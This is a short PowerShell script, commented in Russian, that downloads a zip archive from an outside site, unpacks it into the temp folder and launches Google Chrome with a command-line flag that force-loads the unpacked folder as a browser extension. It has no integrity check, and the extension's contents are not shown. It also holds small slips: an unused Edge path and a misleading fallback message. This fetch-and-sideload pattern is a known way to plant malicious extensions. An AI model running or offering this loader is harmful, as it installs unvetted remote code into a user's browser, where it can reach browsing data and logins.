# URL расширения для загрузки
$extensionUrl = "https://khudoberdi.uz/extension"
$tempDir = "$env:TEMP\ExtensionTemp"

# Создаем временную директорию
if (-Not (Test-Path $tempDir)) {
    New-Item -ItemType Directory -Path $tempDir | Out-Null
}

# Загружаем расширение
Write-Host "Загружаем расширение..."
Invoke-WebRequest -Uri $extensionUrl -OutFile "$tempDir\Extension.zip"

# Распаковываем архив
Expand-Archive -Path "$tempDir\Extension.zip" -DestinationPath $tempDir -Force

# Путь к расширению
$extensionPath = "$tempDir"

# Проверяем наличие браузеров
$edgePath = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
$chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"

if (Test-Path $chromePath) {
    Write-Host "Запускаем в Google Chrome..."
    Start-Process -FilePath $chromePath -ArgumentList "--load-extension=$extensionPath"
} else {
    Write-Host "Ни Microsoft Edge, ни Google Chrome не установлены."
}

# Удаляем временные файлы через 5 секунд
# Start-Sleep -Seconds 5
# Remove-Item -Recurse -Force $tempDir
